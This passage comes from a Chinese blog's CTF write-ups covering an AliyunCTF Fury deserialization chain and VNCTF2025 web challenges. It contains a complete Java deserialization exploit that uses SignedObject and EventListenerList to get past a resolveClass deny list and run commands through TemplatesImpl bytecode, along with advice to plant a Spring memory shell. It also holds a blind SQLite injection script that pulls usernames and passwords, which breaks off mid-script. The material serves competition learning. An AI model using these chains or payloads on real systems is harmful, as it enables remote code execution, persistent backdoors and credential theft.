(java.lang.reflect)<br>invokeReadObject:<span class="hljs-number">1185</span>, ObjectStreamClass (java.io)<br>readSerialData:<span class="hljs-number">2345</span>, ObjectInputStream (java.io)<br>readOrdinaryObject:<span class="hljs-number">2236</span>, ObjectInputStream (java.io)<br>readObject0:<span class="hljs-number">1692</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">508</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">466</span>, ObjectInputStream (java.io)<br>readObj:<span class="hljs-number">615</span>, IoUtil (cn.hutool.core.io)<br>readObj:<span class="hljs-number">582</span>, IoUtil (cn.hutool.core.io)<br>readObj:<span class="hljs-number">563</span>, IoUtil (cn.hutool.core.io)<br>deserialize:<span class="hljs-number">65</span>, SerializeUtil (cn.hutool.core.util)<br>deserialize:<span class="hljs-number">594</span>, ObjectUtil (cn.hutool.core.util)<br>convertInternal:<span class="hljs-number">81</span>, BeanConverter (cn.hutool.core.convert.impl)<br>convert:<span class="hljs-number">58</span>, AbstractConverter (cn.hutool.core.convert)<br>convert:<span class="hljs-number">288</span>, ConverterRegistry (cn.hutool.core.convert)<br>convert:<span class="hljs-number">307</span>, ConverterRegistry (cn.hutool.core.convert)<br>convertWithCheck:<span class="hljs-number">765</span>, Convert (cn.hutool.core.convert)<br>convert:<span class="hljs-number">718</span>, Convert (cn.hutool.core.convert)<br>convert:<span class="hljs-number">689</span>, Convert (cn.hutool.core.convert)<br>invoke:<span class="hljs-number">147</span>, MapProxy (cn.hutool.core.map)<br>getDigester:-<span class="hljs-number">1</span>, $Proxy0 (com.sun.proxy)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>invokeMethod:<span class="hljs-number">1922</span>, PropertyUtilsBean (com.feilong.lib.beanutils) [<span class="hljs-number">1</span>]<br>getSimpleProperty:<span class="hljs-number">1095</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getSimpleProperty:<span class="hljs-number">1079</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">825</span>, PropertyUtilsBean (com.feilong.lib.beanutils)<br>getProperty:<span class="hljs-number">162</span>, PropertyUtils (com.feilong.lib.beanutils)<br>getDataUseApache:<span class="hljs-number">89</span>, PropertyValueObtainer (com.feilong.core.bean)<br>obtain:<span class="hljs-number">70</span>, PropertyValueObtainer (com.feilong.core.bean)<br>getProperty:<span class="hljs-number">577</span>, PropertyUtil (com.feilong.core.bean)<br>compare:<span class="hljs-number">430</span>, PropertyComparator (com.feilong.core.util.comparator)<br>siftUpUsingComparator:<span class="hljs-number">669</span>, PriorityQueue (java.util)<br>siftUp:<span class="hljs-number">645</span>, PriorityQueue (java.util)<br>offer:<span class="hljs-number">344</span>, PriorityQueue (java.util)<br>add:<span class="hljs-number">321</span>, PriorityQueue (java.util)<br>readSameTypeElements:<span class="hljs-number">694</span>, AbstractCollectionSerializer (org.apache.fury.serializer.collection)<br>generalJavaRead:<span class="hljs-number">672</span>, AbstractCollectionSerializer (org.apache.fury.serializer.collection)<br>readElements:<span class="hljs-number">595</span>, AbstractCollectionSerializer (org.apache.fury.serializer.collection)<br>read:<span class="hljs-number">73</span>, CollectionSerializer (org.apache.fury.serializer.collection)<br>read:<span class="hljs-number">28</span>, CollectionSerializer (org.apache.fury.serializer.collection)<br>readDataInternal:<span class="hljs-number">972</span>, Fury (org.apache.fury)<br>readRef:<span class="hljs-number">865</span>, Fury (org.apache.fury)<br>deserialize:<span class="hljs-number">797</span>, Fury (org.apache.fury)<br>deserialize:<span class="hljs-number">718</span>, Fury (org.apache.fury)<br></code></pre></td></tr></table></figure><p>这篇文章分析链子挺好：<a href="https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HO5E0WejTX00WfrQI8oI22YsiTkxiEcLfLgbYyWv">AliyunCTF2025 题解之 Jtools Fury 反序列化利用分析</a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最后，还是期望国赛华北那道fury有高手能看看怎么做，或者patch的方法也可以交流一下。</p><p>逻辑是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ApiController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">api</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;apistr&quot;,required = false,defaultValue = &quot;&quot;)</span> String apistr, Model model)</span> &#123;<br>        <span class="hljs-keyword">if</span> (apistr.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;&#123; \&quot;id\&quot;: 1, \&quot;name\&quot;: \&quot;admin\&quot;, \&quot;age\&quot;: 21, \&quot;phone\&quot;: \&quot;13300000000\&quot; &#125;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Fury</span> <span class="hljs-variable">fury</span> <span class="hljs-operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="hljs-literal">false</span>).build();<br>                <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(apistr);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> fury.deserialize(decode);<br>                <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> JSONUtil.parseObj(person);<br>                model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, entries.toString());<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;error apistr&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>依赖也是hutool，多了spring、jackson、thymeleaf、snakeyaml这些。</p><p>而每年的AliyunCTF都会让后面大大小小的CTF有所借鉴，或许对于fury反序列化的研究是即将成为众矢之的了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025-WEB</title>
    <link href="/2025/02/09/VNCTF2025-WEB/"/>
    <url>/2025/02/09/VNCTF2025-WEB/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随便看看，随便打打。</p><p>SQL不想做。</p><h2 id="javaGuide"><a href="#javaGuide" class="headerlink" title="javaGuide"></a>javaGuide</h2><p>比较简单的缝合，题目给了一个反序列化入口，依赖是<code>fastjson1.2.83</code>，可以直接用fj原生打底。</p><p>但这里重写了<code>resolveClass</code>来对序列化数据进行check：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;com.fasterxml.jackson&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(String denyClass : denyClasses) &#123;<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然直接ban的是<code>TemplateImpl</code>和<code>BadAttributeValueExpException</code>以及<code>Jackson</code>，但是仍然有绕过的方法。</p><p>首先我想到了用<code>UTF-8 Overlong Encoding</code>绕过，但是这次竟然没成功，过不了这里的<code>resolveClass</code>：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210004822341.png" alt="image-20250210004822341"></p><p>这里直接调了Jackson，可能是这个原因。</p><p>绕这个<code>resolveClass</code>的常见方法还有<code>SignedObject</code>二次反序列化，但是直接打也绕不过<code>javax.management.BadAttributeValueExpException</code>，这里换一个触发的<code>EventListenerList</code>，这个来自<code>Jackson</code>原生。</p><p>一调就通：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.example.javaguide.MyObjectInputStream;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br><br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        list.add(templates);          <span class="hljs-comment">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray2.add(templates);           <span class="hljs-comment">//此时在handles这个hash表中查到了映射，后续则会以引用形式输出</span><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray2);<br><br>        list.add(bd);<br><br>        <span class="hljs-comment">//二次反序列化</span><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) list, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-comment">//触发SignedObject#getObject</span><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray1.add(signedObject);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonArray1);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        <span class="hljs-comment">//BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">//setFieldValue(bd1,&quot;val&quot;,jsonArray1);</span><br><br><br>        <span class="hljs-comment">//验证</span><br>        <span class="hljs-type">byte</span>[] payload = ser(eventListenerList);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload_b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(payload);<br>        System.out.println(payload_b64);<br><br>        <span class="hljs-comment">//多打两次，才能缓存成功</span><br>        <span class="hljs-comment">//try &#123;</span><br>        <span class="hljs-comment">//    des_waf(payload_b64);</span><br>        <span class="hljs-comment">//&#125; catch (Exception e)&#123;</span><br>        <span class="hljs-comment">//    ;</span><br>        <span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br>        <span class="hljs-comment">//try &#123;</span><br>        <span class="hljs-comment">//    des_waf(payload_b64);</span><br>        <span class="hljs-comment">//&#125; catch (Exception e)&#123;</span><br>        <span class="hljs-comment">//    ;</span><br>        <span class="hljs-comment">//&#125;</span><br>        <span class="hljs-comment">//Unauthorized deserialization attempt; javax.management.BadAttributeValueExpException用EventListnerList绕了</span><br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">des_normal</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">des_waf</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload);<br>        <span class="hljs-type">MyObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210005304971.png" alt="image-20250210005304971"></p><p>题目说了不出网，套一个Spring内存马写入byteCode就完事了。</p><p>注意二次反序列化第一次会报构造函数的错，因为没有缓存，这种情况打两次就好了。</p><p>本地：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210005422676.png" alt="image-20250210005422676"></p><p>远程：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210005433478.png" alt="image-20250210005433478"></p><p>参考：</p><p><a href="https://blog.csdn.net/qq_44223394/article/details/131696371">fastjson1.2.83反序列化漏洞_fastjson 1.2.83漏洞-CSDN博客</a></p><p><a href="https://dummykitty.github.io/java/2023/07/24/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-resolveClass.html">Java 反序列化绕过 resolvClass - DumKiy’s blog</a></p><p><a href="https://www.freebuf.com/articles/network/369855.html">Fastjson 结合 jdk 原生反序列化的利用手法 ( Aliyun CTF ) - FreeBuf网络安全行业门户</a></p><p><a href="https://github.com/Avento/MemShell4Spring/blob/main/No2_ControllerHandlerShell.java">MemShell4Spring&#x2F;No2_ControllerHandlerShell.java at main · Avento&#x2F;MemShell4Spring</a></p><h2 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h2><p>Sqlite数据库的时间盲注。</p><p>也能测出waf是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span>,空格,<span class="hljs-operator">=</span>,sleep,bench<br></code></pre></td></tr></table></figure><p>但是可以使用<code>randomblob</code>替换。而且<code>/**/</code>也没ban，套一下官方的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:44824/login&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">500</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low&lt;high):<br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        payload = <span class="hljs-string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(username))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(mid))<br>        <span class="hljs-comment"># payload= &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br>        <span class="hljs-comment"># payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(300000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br><br>        datas = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eddie&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: payload<br>        &#125;<br>        <span class="hljs-comment"># print(datas)</span><br>        start_time=time.time()<br>        res = requests.post(url=url,json=datas)<br>        end_time=time.time()<br>        